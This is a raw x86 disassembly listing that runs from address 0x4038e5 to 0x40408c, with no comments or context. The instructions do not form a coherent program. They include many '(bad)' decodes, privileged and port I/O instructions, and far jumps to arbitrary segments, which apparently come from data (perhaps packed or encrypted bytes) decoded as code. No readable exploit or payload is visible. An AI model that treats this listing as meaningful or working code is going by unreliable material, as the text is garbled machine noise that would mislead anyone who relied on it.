  4038e5:	mov    BYTE PTR [edi],ah
  4038e7:	sbb    bh,BYTE PTR [edx]
  4038e9:	fidivr WORD PTR [edi]
  4038eb:	adc    BYTE PTR [eax],ch
  4038ed:	mov    esp,0xc2d7090a
  4038f2:	pop    ebp
  4038f3:	dec    edx
  4038f4:	mov    eax,ds:0x8076f81e
  4038f9:	fcomp  QWORD PTR [ecx-0x6c069633]
  4038ff:	call   DWORD PTR [eax-0x200bbd24]
  403905:	mov    dl,BYTE PTR [edx-0xb35ab95]
  40390b:	inc    edi
  40390c:	sbb    eax,0x4dfc40fc
  403911:	xchg   edi,eax
  403912:	aam    0x9a
  403914:	cmp    eax,DWORD PTR [ecx+0xc88cf72]
  40391a:	retf   0x8285
  40391d:	jle    0x403918
  40391f:	inc    eax
  403920:	jg     0x403959
  403922:	test   eax,0x2b9caa60
  403927:	(bad)  
  403928:	mov    edi,0x74985e38
  40392d:	mov    ds:0x912029fa,eax
  403932:	xor    bh,dl
  403934:	push   ebx
  403935:	pushf  
  403936:	sub    al,BYTE PTR [ecx+ebp*4+0x1befefc]
  40393d:	rcl    al,0x13
  403940:	icebp  
  403941:	test   BYTE PTR [ecx+0x1a],bh
  403944:	xlat   BYTE PTR ds:[ebx]
  403945:	mov    esi,0xab47960
  40394a:	fisttp QWORD PTR ds:0xd90e8d3
  403950:	out    dx,al
  403951:	or     ecx,DWORD PTR [edx-0xba25bb7]
  403957:	adc    al,0x43
  403959:	pop    edx
  40395a:	(bad)  [eax-0x48]
  40395d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40395e:	enter  0xd244,0x4e
  403962:	inc    edi
  403963:	repz test BYTE PTR [ebp+0x2534868c],al
  40396a:	xlat   BYTE PTR ds:[ebx]
  40396b:	daa    
  40396c:	cmp    DWORD PTR [esi-0x42],ebp
  40396f:	or     BYTE PTR [edx+eax*4+0x720d62be],0x7e
  403977:	xor    ebp,edi
  403979:	mov    ch,0xa7
  40397b:	loop   0x4039a0
  40397d:	ins    DWORD PTR es:[edi],dx
  40397e:	adc    DWORD PTR [edx-0x4b077700],esi
  403984:	(bad)  
  403986:	cli    
  403987:	out    0x86,eax
  403989:	sbb    bl,bh
  40398b:	test   DWORD PTR [edx+0x6],esp
  40398e:	test   BYTE PTR [ecx+edx*4+0x43],0x4a
  403993:	scas   eax,DWORD PTR es:[edi]
  403994:	cmp    BYTE PTR [edi+0x69],al
  403997:	mov    cl,0x57
  403999:	inc    esp
  40399a:	sti    
  40399b:	xchg   DWORD PTR [ebx],esp
  40399d:	cmp    ecx,eax
  40399f:	push   esi
  4039a0:	xchg   ebx,eax
  4039a1:	add    DWORD PTR [ebp-0x72],ebx
  4039a4:	push   edi
  4039a5:	jmp    FWORD PTR [edi-0x1]
  4039a8:	adc    DWORD PTR [ecx-0x2ca5a087],esp
  4039ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039af:	cdq    
  4039b0:	pushf  
  4039b1:	sbb    DWORD PTR [ebp-0x5d],ebx
  4039b4:	sbb    DWORD PTR [ebx-0x78],ecx
  4039b7:	push   edx
  4039b8:	pop    ebx
  4039b9:	push   eax
  4039ba:	enter  0x37fe,0x2
  4039be:	mov    WORD PTR [edi],es
  4039c0:	sbb    DWORD PTR [ebp+0x2c02f9f3],esi
  4039c6:	jl     0x403978
  4039c8:	mov    WORD PTR ss:[ebx+0x6abb6d4e],ds
  4039cf:	mov    cl,0x5e
  4039d1:	and    edx,ebp
  4039d3:	add    DWORD PTR ds:0x35424b41,ebp
  4039d9:	hlt    
  4039da:	mov    bh,0x49
  4039dc:	test   eax,0xe3c6c05d
  4039e1:	jle    0x4039af
  4039e3:	fsin   
  4039e5:	add    cl,bl
  4039e7:	aad    0xaf
  4039e9:	mov    cl,0xb7
  4039eb:	mov    esi,DWORD PTR [ebx]
  4039ed:	mov    BYTE PTR [esi+ecx*8+0x14f2f089],bl
  4039f4:	push   ds
  4039f5:	xor    BYTE PTR [edx],bl
  4039f7:	(bad)  
  4039f8:	cmc    
  4039f9:	xchg   edi,eax
  4039fa:	sbb    edi,DWORD PTR [ebx+0x3]
  4039fd:	push   eax
  4039fe:	jecxz  0x403a10
  403a00:	adc    DWORD PTR [eax+0x69],ebx
  403a03:	mov    esp,0xafe50d13
  403a08:	cmp    esi,DWORD PTR [eax-0x9924337]
  403a0e:	in     al,0xda
  403a10:	das    
  403a11:	and    BYTE PTR [ecx-0x72b9b7a5],ch
  403a17:	inc    esp
  403a18:	mov    ah,BYTE PTR [edx]
  403a1a:	aas    
  403a1b:	jle    0x403a70
  403a1d:	dec    ebx
  403a1e:	shl    ch,0x3d
  403a21:	inc    eax
  403a22:	(bad)
  403a25:	jne    0x403a96
  403a27:	(bad)  
  403a28:	leave  
  403a29:	paddq  mm3,mm2
  403a2c:	(bad)  
  403a2f:	loopne 0x4039fd
  403a31:	mov    esp,0x57b3c391
  403a36:	mov    dh,0x8a
  403a38:	sti    
  403a39:	sub    esp,DWORD PTR [esi]
  403a3b:	sbb    al,0x19
  403a3d:	xchg   ebx,eax
  403a3e:	pusha  
  403a3f:	gs jne 0x403a4c
  403a42:	dec    ecx
  403a43:	adc    BYTE PTR [ebx-0x7747d069],cl
  403a49:	inc    edx
  403a4a:	not    DWORD PTR [ebx-0x44]
  403a4d:	jmp    0x84552b50
  403a52:	addr16 jle 0x403a82
  403a55:	outs   dx,BYTE PTR ds:[esi]
  403a56:	jae    0x403a64
  403a58:	and    BYTE PTR [ebp+0x3e],ah
  403a5b:	jae    0x4039e1
  403a5d:	mov    esi,0x9a098136
  403a62:	or     esi,ebp
  403a64:	jge    0x403a8b
  403a66:	and    DWORD PTR [esi-0x36],0x802dd135
  403a6d:	aad    0x1e
  403a6f:	fstp   QWORD PTR [ecx]
  403a71:	pop    ecx
  403a72:	adc    esi,DWORD PTR [esi+0x330be328]
  403a78:	loope  0x403aae
  403a7a:	push   edi
  403a7b:	dec    edi
  403a7c:	je     0x403ab2
  403a7e:	loop   0x403abb
  403a80:	fiadd  DWORD PTR [edi]
  403a82:	sahf   
  403a83:	mov    dl,0xad
  403a85:	out    dx,al
  403a86:	push   ds
  403a87:	call   0x2c5c:0xe35c44a2
  403a8e:	pop    ecx
  403a8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a90:	popa   
  403a91:	and    DWORD PTR [edx-0x62],edi
  403a94:	cwde   
  403a95:	cs cld 
  403a97:	loopne 0x403aeb
  403a99:	xor    BYTE PTR [esi],0xc1
  403a9c:	(bad)  
  403a9d:	mov    ebp,edi
  403a9f:	loop   0x403ad9
  403aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aa2:	cmp    bl,BYTE PTR [ebp-0x2f3097ad]
  403aa8:	pushf  
  403aa9:	(bad)  
  403aaa:	cmp    esp,esi
  403aac:	jne    0x403a90
  403aae:	cmp    BYTE PTR [eax-0x669792bb],cl
  403ab4:	je     0x403afe
  403ab6:	rcr    BYTE PTR [edi+0x9],0xa3
  403aba:	in     al,dx
  403abb:	dec    ebx
  403abc:	popa   
  403abd:	shr    edx,cl
  403abf:	add    ebx,ebx
  403ac1:	dec    ebp
  403ac2:	jo     0x403ad3
  403ac4:	mov    ch,0xe0
  403ac6:	clc    
  403ac7:	xchg   edi,eax
  403ac8:	cmp    BYTE PTR [edx-0x1f4edc16],ch
  403ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403acf:	mov    esi,0x9a8d60d2
  403ad4:	dec    ebp
  403ad5:	outs   dx,DWORD PTR ds:[esi]
  403ad6:	inc    esi
  403ad7:	mov    ds:0xfdbf993,eax
  403adc:	les    eax,FWORD PTR [ebp+0x37]
  403adf:	aam    0x51
  403ae1:	das    
  403ae2:	(bad)  
  403ae3:	fnstsw WORD PTR [edx-0x28a8c073]
  403ae9:	dec    ebp
  403aea:	sub    eax,0x31545dc5
  403aef:	push   es
  403af0:	outs   dx,DWORD PTR ds:[esi]
  403af1:	pop    eax
  403af2:	mov    ch,0xaf
  403af4:	or     dh,BYTE PTR [ebx+0x61]
  403af7:	add    eax,DWORD PTR [esi+0x76]
  403afa:	mov    esi,DWORD PTR [eax+0x7b]
  403afd:	test   al,0x14
  403aff:	xor    BYTE PTR [edx],dl
  403b01:	sbb    al,0x92
  403b03:	je     0x403b63
  403b05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b06:	adc    dh,BYTE PTR [esi]
  403b08:	fstp   TBYTE PTR [esi-0x2c]
  403b0b:	jl     0x403b2f
  403b0d:	ins    BYTE PTR es:[edi],dx
  403b0e:	mov    cl,0x14
  403b10:	out    0x64,eax
  403b12:	jl     0x403b1c
  403b14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b16:	cwde   
  403b17:	dec    ecx
  403b18:	dec    DWORD PTR [eax+edi*4+0x761cbeea]
  403b1f:	sub    al,BYTE PTR [ebp+0x28]
  403b22:	push   edx
  403b23:	xchg   esi,eax
  403b24:	pushf  
  403b25:	cmp    al,cl
  403b27:	push   eax
  403b28:	add    al,0x8a
  403b2a:	sahf   
  403b2b:	test   eax,0x40f470ad
  403b30:	ret    
  403b31:	or     dl,BYTE PTR [edx]
  403b33:	rcr    DWORD PTR [edi+0x2fbf93a1],0x5f
  403b3a:	pop    esi
  403b3b:	push   esp
  403b3c:	imul   esi,ebx,0x16bc41c2
  403b42:	aaa    
  403b43:	mov    ebp,0x5228c000
  403b48:	jle    0x403b89
  403b4a:	gs sbb al,0x96
  403b4d:	in     al,dx
  403b4e:	out    0xd2,al
  403b50:	in     al,0x2a
  403b52:	sti    
  403b53:	ins    DWORD PTR es:[edi],dx
  403b54:	cmp    BYTE PTR [edx+0x3e],bl
  403b57:	xor    ah,ah
  403b59:	and    cl,BYTE PTR [ecx-0x56]
  403b5c:	imul   BYTE PTR [ebp-0xa88b1fc]
  403b62:	xor    edx,eax
  403b64:	ins    DWORD PTR es:[edi],dx
  403b65:	sbb    edx,DWORD PTR [esi+0x477e5b41]
  403b6b:	cld    
  403b6c:	jae    0x403b85
  403b6e:	mov    eax,0xe5d6669f
  403b73:	dec    ebx
  403b74:	jnp    0x403bad
  403b76:	mov    DWORD PTR [ecx+0x28],edx
  403b79:	and    al,0xfb
  403b7b:	sbb    al,0x47
  403b7d:	mov    ecx,0xc11ce75e
  403b82:	(bad)  
  403b83:	imul   DWORD PTR ds:0xbc6c05da
  403b89:	push   0xcb49e976
  403b8e:	dec    edi
  403b8f:	stc    
  403b90:	inc    ebp
  403b91:	ins    DWORD PTR es:[edi],dx
  403b92:	out    dx,al
  403b93:	enter  0x6453,0x43
  403b97:	dec    ebx
  403b98:	in     eax,0x71
  403b9a:	int    0xf3
  403b9c:	xchg   edi,eax
  403b9d:	cmp    ebx,DWORD PTR ds:[edx]
  403ba0:	mov    dh,0x4c
  403ba2:	push   0xffffffe3
  403ba4:	adc    bl,BYTE PTR [eax+0x3c9a5bec]
  403baa:	les    edx,FWORD PTR [eax+ebx*2-0x45fbb10f]
  403bb1:	lahf   
  403bb2:	mov    eax,0x3d6a1cc5
  403bb7:	inc    esi
  403bb8:	clc    
  403bb9:	and    al,0x69
  403bbb:	jg     0x403bae
  403bbd:	test   eax,0x6fe91440
  403bc2:	adc    esp,esp
  403bc4:	and    al,0x1f
  403bc6:	ficom  DWORD PTR [esi-0x57]
  403bc9:	and    al,0x3c
  403bcb:	in     eax,0x19
  403bcd:	cmp    eax,0x34849fe
  403bd2:	sbb    al,0x81
  403bd4:	cmp    esi,DWORD PTR [esi-0x51]
  403bd7:	xor    eax,0x75956b67
  403bdc:	xor    DWORD PTR [ebx-0x49],0xcbe6586c
  403be3:	icebp  
  403be4:	test   eax,0x1ce6014f
  403be9:	hlt    
  403bea:	cmp    BYTE PTR [ebx-0x1a],bh
  403bed:	cmp    DWORD PTR [ecx],eax
  403bef:	ret    
  403bf0:	adc    eax,0xba334593
  403bf5:	inc    esp
  403bf6:	stos   DWORD PTR es:[edi],eax
  403bf7:	mov    ecx,0x681e3a11
  403bfc:	jne    0x403bd4
  403bfe:	pop    es
  403bff:	sub    cl,BYTE PTR fs:[esp+eiz*8+0x22]
  403c04:	stos   BYTE PTR es:[edi],al
  403c05:	aam    0xc8
  403c07:	loope  0x403c0a
  403c09:	cmp    ch,BYTE PTR [ecx-0x78114b71]
  403c0f:	scas   al,BYTE PTR es:[edi]
  403c10:	mov    ecx,0xa6075376
  403c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c16:	sub    bl,BYTE PTR [ebx+0x3845be2]
  403c1c:	repnz dec esp
  403c1e:	call   0x5a9e:0x1efe3e0f
  403c25:	pop    ds
  403c26:	and    al,0x70
  403c28:	(bad)  
  403c29:	in     eax,dx
  403c2a:	ja     0x403bc3
  403c2c:	dec    ecx
  403c2d:	lahf   
  403c2e:	xchg   esp,eax
  403c2f:	pop    edi
  403c30:	sub    DWORD PTR [ebp+ecx*1-0x4598de6c],esp
  403c37:	gs sbb cl,dh
  403c3a:	sbb    al,0x40
  403c3c:	or     eax,0x57f81dfe
  403c41:	shl    DWORD PTR [edx-0x739d903],0x52
  403c48:	pop    edi
  403c4a:	(bad)  
  403c4b:	xlat   BYTE PTR ds:[ebx]
  403c4c:	in     al,0x4f
  403c4e:	call   0xf6cb03b
  403c53:	(bad)  
  403c54:	adc    DWORD PTR [eax+0x75d8d8ff],esi
  403c5a:	arpl   cx,sp
  403c5c:	jo     0x403cdc
  403c5e:	fimul  DWORD PTR [ebx]
  403c60:	mov    ah,0x7a
  403c62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c63:	dec    edi
  403c64:	rol    DWORD PTR [edi-0x75],0x1e
  403c68:	sub    ebx,DWORD PTR [edi]
  403c6a:	xor    DWORD PTR [ecx+0x519910a2],edi
  403c70:	cmp    esp,DWORD PTR [edx+0x13]
  403c73:	gs mov ch,0xb3
  403c76:	and    DWORD PTR [eax],eax
  403c78:	stc    
  403c79:	adc    DWORD PTR [ebp-0x270b4451],edx
  403c7f:	jns    0x403c15
  403c81:	xchg   edi,eax
  403c82:	push   ecx
  403c83:	(bad)  
  403c84:	mov    ch,0x8a
  403c86:	pushf  
  403c87:	scas   eax,DWORD PTR es:[edi]
  403c88:	cdq    
  403c89:	shl    DWORD PTR [edx+ebx*4+0x390d445f],0x58
  403c91:	jmp    0x403c69
  403c93:	xchg   BYTE PTR [edx+esi*2+0x16],dh
  403c97:	push   eax
  403c98:	out    dx,al
  403c99:	retf   0xb53
  403c9c:	fild   DWORD PTR [ebx+0x3e]
  403c9f:	(bad)  
  403ca0:	loop   0x403caa
  403ca2:	or     esp,ebx
  403ca4:	rol    ah,cl
  403ca6:	sub    BYTE PTR [eax+0x26],ch
  403ca9:	sahf   
  403caa:	mov    esp,0xa859cdf7
  403caf:	dec    esp
  403cb0:	jmp    DWORD PTR [edx+edx*1]
  403cb3:	pushf  
  403cb4:	imul   esp,edx,0x630ecc2f
  403cba:	daa    
  403cbb:	inc    edx
  403cbc:	and    dl,BYTE PTR [edx+0x36830ba2]
  403cc2:	mov    ah,0xd5
  403cc4:	dec    ebx
  403cc5:	clc    
  403cc6:	or     cl,cl
  403cc8:	mov    ebp,0xb5243b3
  403ccd:	not    DWORD PTR [eax+0x43924e16]
  403cd3:	int3   
  403cd4:	pop    es
  403cd5:	icebp  
  403cd6:	jmp    0x8f8d:0xd79920ac
  403cdd:	ret    
  403cde:	mov    ch,0xa1
  403ce0:	mov    ebx,0xccdb4916
  403ce5:	adc    ebx,DWORD PTR [ebx]
  403ce7:	or     DWORD PTR [ebx-0x5b],ecx
  403cea:	dec    edx
  403ceb:	sub    bl,ah
  403ced:	xchg   BYTE PTR [ecx+0x16a12fe3],ah
  403cf3:	out    dx,eax
  403cf4:	mov    ebp,0xdfd0c533
  403cf9:	(bad)  
  403cfa:	cmc    
  403cfb:	mov    ds:0x2067a96c,al
  403d00:	test   DWORD PTR [esi+esi*8],eax
  403d03:	scas   eax,DWORD PTR es:[edi]
  403d04:	leave  
  403d05:	ja     0x403d5a
  403d07:	xchg   ebx,eax
  403d08:	test   BYTE PTR [ebp+0x7e491e33],dh
  403d0e:	sbb    eax,ebx
  403d10:	lods   al,BYTE PTR ds:[esi]
  403d11:	jmp    0x959d:0xd5924782
  403d18:	mov    ds:0x1730214f,al
  403d1d:	sbb    ah,BYTE PTR [esi-0x7b]
  403d20:	out    0xa,al
  403d22:	adc    ch,ah
  403d24:	in     eax,0xdb
  403d26:	sub    edi,ebp
  403d28:	mov    DWORD PTR [esi+0x46],ecx
  403d2b:	mov    esp,0x10149c26
  403d30:	ret    
  403d31:	shr    DWORD PTR [ebx+0x4578783f],cl
  403d37:	sahf   
  403d38:	jmp    0x837847f0
  403d3d:	iret   
  403d3e:	jecxz  0x403db9
  403d40:	and    ah,BYTE PTR [ecx-0x9]
  403d43:	xor    dl,BYTE PTR [esi-0x61f1aee]
  403d49:	or     eax,0x1530f7c
  403d4e:	jp     0x403d34
  403d50:	fsubr  st,st(6)
  403d52:	loop   0x403d35
  403d54:	xchg   ebp,eax
  403d55:	jae    0x403cff
  403d57:	mov    ah,0x5c
  403d59:	cmp    ebp,DWORD PTR [edx-0x2a]
  403d5c:	shr    DWORD PTR [edi-0x32],0x24
  403d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d61:	inc    esp
  403d62:	fcomp  QWORD PTR [edi-0x60da15c3]
  403d68:	pop    esi
  403d69:	push   edi
  403d6a:	cmp    al,0x7d
  403d6c:	xlat   BYTE PTR ds:[ebx]
  403d6d:	rcr    BYTE PTR [esp+ebp*1-0x56],cl
  403d71:	sub    ch,bh
  403d73:	mov    ebp,0xcf97091b
  403d78:	int    0x32
  403d7a:	popf   
  403d7b:	xor    ebp,edi
  403d7d:	mov    ds:0xb5334b2d,eax
  403d82:	and    ah,BYTE PTR [ebx-0x154b1cc6]
  403d88:	ud1    edx,DWORD PTR [ebx+0x44]
  403d8c:	pop    edx
  403d8d:	jne    0x403dbd
  403d8f:	test   al,0x32
  403d91:	adc    eax,0x4b1fbf8d
  403d96:	inc    eax
  403d97:	jb     0x403d1d
  403d99:	mov    ds:0xee2305de,al
  403d9e:	jno    0x403d51
  403da0:	adc    al,0xa
  403da2:	mov    ds:0x2adfbe35,al
  403da7:	jne    0x403d78
  403da9:	bound  ebx,QWORD PTR [edx+0x3f59d50]
  403daf:	mov    edi,ebp
  403db1:	sub    eax,0xb622e369
  403db6:	xchg   DWORD PTR [ecx],esi
  403db8:	shr    BYTE PTR [ecx+0x4d8ec415],1
  403dbe:	loope  0x403e2a
  403dc0:	mov    dh,0x4f
  403dc2:	aas    
  403dc3:	scas   al,BYTE PTR es:[edi]
  403dc4:	pushf  
  403dc5:	lods   al,BYTE PTR ds:[esi]
  403dc6:	inc    eax
  403dc7:	cli    
  403dc8:	or     eax,0xa485cce4
  403dcd:	cmp    bl,BYTE PTR [ecx+ebp*4]
  403dd0:	pop    edx
  403dd1:	cld    
  403dd2:	aad    0x1c
  403dd4:	stc    
  403dd5:	dec    ebp
  403dd6:	dec    ebx
  403dd7:	aaa    
  403dd8:	xchg   esp,eax
  403dd9:	cld    
  403dda:	mov    edi,edx
  403ddc:	sti    
  403ddd:	mov    esp,0x82603cf8
  403de2:	js     0x403e35
  403de4:	out    0xcf,eax
  403de6:	int    0xe3
  403de8:	sub    DWORD PTR [ecx-0x10],edi
  403deb:	mov    ebp,DWORD PTR [edi+0x5b9b2813]
  403df1:	mov    ebx,0xdc6b9acf
  403df6:	add    BYTE PTR ds:[edx-0x5e],0x8d
  403dfb:	push   edx
  403dfc:	mov    DWORD PTR [edx+ebx*2],ecx
  403dff:	sbb    ch,ah
  403e01:	xor    DWORD PTR [ebp+edx*2+0xf373faf],0x458bd9a9
  403e0c:	jg     0x403e3b
  403e0e:	mov    bl,0x49
  403e10:	retf   0xe77
  403e13:	mov    dl,BYTE PTR [edx+0x1ef5a308]
  403e19:	xchg   edx,eax
  403e1a:	out    0x89,al
  403e1c:	push   ds
  403e1d:	icebp  
  403e1e:	in     eax,dx
  403e1f:	cdq    
  403e20:	xchg   ebp,eax
  403e21:	adc    ebx,DWORD PTR [ebx]
  403e23:	adc    edi,edi
  403e25:	mov    ecx,edx
  403e27:	in     al,dx
  403e28:	mov    eax,0x4e4b4567
  403e2d:	cmp    ecx,DWORD PTR [edi]
  403e2f:	xchg   edx,eax
  403e30:	sub    DWORD PTR [edi+0x91cb021],ecx
  403e36:	imul   edx,DWORD PTR [esi+eax*8-0x41],0x35
  403e3b:	outs   dx,DWORD PTR ds:[esi]
  403e3c:	sub    BYTE PTR [esi+edx*2-0x581c3fff],dh
  403e43:	shr    BYTE PTR [esi],cl
  403e45:	fdiv   DWORD PTR [ebp+0x15c52203]
  403e4b:	(bad)  [ecx-0x3b71bc2]
  403e51:	and    DWORD PTR [ebx],ecx
  403e53:	push   es
  403e54:	mov    dh,0x89
  403e56:	and    DWORD PTR [ebp+edx*2-0x4e14341f],edi
  403e5d:	xor    DWORD PTR [ecx-0x22],esp
  403e60:	mov    al,ds:0x8152e593
  403e65:	lea    ebx,[esi]
  403e67:	inc    eax
  403e68:	ds jnp 0x403e4a
  403e6b:	lds    esi,FWORD PTR [ebp-0x35920848]
  403e71:	adc    edi,esp
  403e73:	ret    
  403e74:	leave  
  403e75:	push   0x5634d527
  403e7a:	out    0x2a,eax
  403e7c:	jle    0x403e19
  403e7e:	out    0xef,eax
  403e80:	push   edx
  403e81:	or     al,BYTE PTR [ebx-0x19b9ac9e]
  403e87:	sbb    ecx,eax
  403e89:	or     dl,BYTE PTR [eax-0x50]
  403e8c:	retf   
  403e8d:	add    al,0x28
  403e8f:	(bad)  
  403e90:	cmp    al,0x97
  403e92:	mov    dh,0xd3
  403e94:	ja     0x403e6b
  403e96:	jne    0x403ea0
  403e98:	addr16 push ebp
  403e9a:	dec    eax
  403e9b:	test   cl,dh
  403e9d:	cmp    BYTE PTR [edx-0x357059ed],bl
  403ea3:	jno    0x403edf
  403ea5:	retf   
  403ea6:	lock iret 
  403ea8:	gs adc eax,0xb3974564
  403eae:	pushf  
  403eaf:	gs stos BYTE PTR es:[edi],al
  403eb1:	cs loope 0x403e73
  403eb4:	scas   al,BYTE PTR es:[edi]
  403eb5:	xchg   ebp,eax
  403eb6:	loop   0x403f36
  403eb8:	repz loopne 0x403f2b
  403ebb:	inc    BYTE PTR [edi-0x73]
  403ebe:	das    
  403ebf:	je     0x403e8b
  403ec1:	pushf  
  403ec2:	dec    eax
  403ec3:	jge    0x403e49
  403ec5:	or     ch,BYTE PTR [ecx+0x4ade1a97]
  403ecb:	(bad)  
  403ecc:	retf   
  403ecd:	stos   DWORD PTR es:[edi],eax
  403ece:	(bad)  
  403ecf:	jnp    0x403f42
  403ed1:	pop    esp
  403ed2:	inc    eax
  403ed3:	retf   
  403ed4:	retf   
  403ed5:	in     al,dx
  403ed6:	inc    ebp
  403ed7:	stc    
  403ed8:	stc    
  403ed9:	push   0xabd7f69c
  403ede:	mov    eax,ds:0x8631f5b7
  403ee3:	jns    0x403f3f
  403ee5:	push   ss
  403ee6:	xchg   ebp,eax
  403ee7:	inc    edi
  403ee8:	mov    ds:0x4c7a6ac4,eax
  403eed:	cmp    ch,BYTE PTR [edx+0x1f4da588]
  403ef3:	xlat   BYTE PTR ds:[ebx]
  403ef4:	test   al,0x51
  403ef6:	repz sbb eax,0xe3388cf5
  403efc:	add    al,0xd1
  403efe:	adc    cl,BYTE PTR [edi+ecx*1-0x3]
  403f02:	loopne 0x403f04
  403f04:	xor    BYTE PTR [edx-0xfe66770],bh
  403f0a:	repz push es
  403f0c:	mov    edx,0x3bcc10e4
  403f11:	popf   
  403f12:	xlat   BYTE PTR ds:[ebx]
  403f13:	jmp    0x403f5b
  403f15:	or     al,0x93
  403f17:	je     0x403f44
  403f19:	mov    ebp,ebp
  403f1b:	push   ecx
  403f1c:	cld    
  403f1d:	jge    0x403eec
  403f1f:	dec    edi
  403f20:	pop    eax
  403f21:	fwait
  403f22:	xchg   BYTE PTR [eax+ebx*1],al
  403f25:	loopne 0x403f5d
  403f27:	pop    eax
  403f28:	in     al,0xe8
  403f2a:	adc    bl,BYTE PTR [edx-0x63]
  403f2d:	pop    esi
  403f2e:	sub    eax,0xb9b637b2
  403f33:	stos   DWORD PTR es:[edi],eax
  403f34:	or     DWORD PTR [edx],0xffffff9e
  403f37:	xchg   ebx,eax
  403f38:	xlat   BYTE PTR ds:[ebx]
  403f3a:	push   edx
  403f3b:	fwait
  403f3c:	adc    edx,DWORD PTR ss:[ecx-0x80]
  403f40:	rol    DWORD PTR [ebp-0x80],1
  403f43:	fidiv  DWORD PTR [ebp+0x4c66248a]
  403f49:	in     al,0xf
  403f4b:	leave  
  403f4c:	aas    
  403f4d:	jb     0x403f94
  403f4f:	lahf   
  403f50:	push   eax
  403f51:	cmp    BYTE PTR [ecx],0x34
  403f54:	adc    bh,BYTE PTR [ebp-0x264a9293]
  403f5a:	xchg   ebx,eax
  403f5b:	out    0xa8,al
  403f5d:	sbb    cl,bh
  403f5f:	jae    0x403efb
  403f61:	pop    ebx
  403f62:	or     eax,0x9686338b
  403f67:	loopne 0x403f94
  403f69:	adc    bh,dl
  403f6b:	idiv   BYTE PTR [edx]
  403f6d:	mov    esi,0x96f79fd2
  403f72:	arpl   bp,di
  403f74:	jge    0x403f1f
  403f76:	leave  
  403f77:	mov    BYTE PTR [esi-0x56],ch
  403f7a:	mov    bl,ah
  403f7c:	sbb    eax,0xa49dcf27
  403f81:	sbb    al,0xaf
  403f83:	addr16 aas 
  403f85:	xchg   edx,eax
  403f86:	jbe    0x403fe8
  403f88:	arpl   WORD PTR [esi],cx
  403f8a:	das    
  403f8b:	pushaw 
  403f8d:	mov    ah,0x95
  403f8f:	(bad)  
  403f90:	push   edx
  403f91:	adc    BYTE PTR [edx+ebx*8],ah
  403f94:	jno    0x403fe0
  403f96:	jb     0x403f90
  403f98:	js     0x403f21
  403f9a:	mov    DWORD PTR [esi+0x2d62f53c],ecx
  403fa0:	adc    cl,BYTE PTR [eax-0x72abb1f0]
  403fa6:	jbe    0x403f7c
  403fa8:	popa   
  403fa9:	aad    0x2
  403fab:	and    BYTE PTR [esp+edi*2-0x21f16f67],ah
  403fb2:	mov    es,WORD PTR [esp+ecx*8+0x59]
  403fb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fb7:	lds    esp,FWORD PTR [ecx+0x74]
  403fba:	out    dx,al
  403fbb:	ss shl esp,0x34
  403fbf:	scas   eax,DWORD PTR es:[edi]
  403fc0:	push   es
  403fc1:	dec    ecx
  403fc2:	stc    
  403fc3:	cli    
  403fc4:	popa   
  403fc5:	call   0xbba03d54
  403fca:	adc    al,BYTE PTR [ecx+0x7a8a6b4]
  403fd0:	pop    ss
  403fd1:	enter  0xa17c,0x91
  403fd5:	das    
  403fd6:	sub    DWORD PTR [eax-0x2a],0x3
  403fda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fdb:	xchg   edx,eax
  403fdc:	pop    ecx
  403fdd:	(bad)  
  403fde:	rcl    ecx,cl
  403fe0:	loope  0x404031
  403fe2:	cmp    al,0x28
  403fe4:	imul   edi,DWORD PTR [edi],0xd25650c0
  403fea:	arpl   WORD PTR ds:0xe1518086,cx
  403ff0:	rcr    DWORD PTR [eax-0x5d87fdc0],cl
  403ff6:	jne    0x403f7f
  403ff8:	cs call 0xf5798310
  403ffe:	inc    ecx
  403fff:	jno    0x403fef
  404001:	call   DWORD PTR [ebp+0x72975159]
  404007:	sub    DWORD PTR [bp+si],esp
  40400a:	pop    ss
  40400b:	repnz mov edi,0x62f4b39c
  404011:	mov    ebp,DWORD PTR [edi-0x10c4c5ee]
  404017:	adc    DWORD PTR [esi+0xa],ebx
  40401a:	sub    BYTE PTR [esi-0x4c],bl
  40401d:	jns    0x40401f
  40401f:	(bad)  
  404020:	xchg   ebp,eax
  404021:	inc    esi
  404022:	ja     0x403fb1
  404024:	sbb    ah,BYTE PTR ds:[eax]
  404027:	push   eax
  404028:	xchg   ebp,eax
  404029:	xchg   ebp,eax
  40402a:	sbb    dl,ah
  40402c:	pop    ebp
  40402d:	rol    DWORD PTR [ecx+0x73],1
  404030:	and    DWORD PTR [ecx-0x359cde1],edx
  404036:	and    ah,BYTE PTR [eax-0x7c163045]
  40403c:	lds    edi,FWORD PTR [ecx-0x1794539]
  404042:	pop    esp
  404043:	adc    bl,BYTE PTR [ebx-0x2c22967d]
  404049:	loop   0x404045
  40404b:	inc    ch
  40404d:	pushf  
  40404e:	push   ebx
  40404f:	xlat   BYTE PTR ds:[ebx]
  404050:	add    DWORD PTR [ebp-0x72a6bb86],esi
  404056:	mov    al,ds:0xccdb5cc1
  40405b:	and    eax,0x5d4c51a9
  404060:	scas   eax,DWORD PTR es:[edi]
  404061:	cmp    esi,DWORD PTR [ebp+ebx*8-0x32]
  404065:	dec    ecx
  404066:	inc    ebp
  404067:	push   eax
  404068:	in     al,dx
  404069:	fmul   QWORD PTR [ecx+edx*8+0x4e]
  40406d:	aas    
  40406e:	pop    eax
  40406f:	adc    bh,BYTE PTR [ecx]
  404071:	xchg   esi,eax
  404072:	ds pop eax
  404074:	mov    bl,0x83
  404076:	imul   DWORD PTR [esi+0xe]
  404079:	mov    ebp,0x8e9add5b
  40407e:	scas   eax,DWORD PTR es:[edi]
  40407f:	loope  0x40404c
  404081:	inc    ebx
  404082:	mov    BYTE PTR cs:[ecx-0x30],ah
  404086:	sub    dh,BYTE PTR [eax-0x5262016b]
  40408c:	cs out 0x27,eax
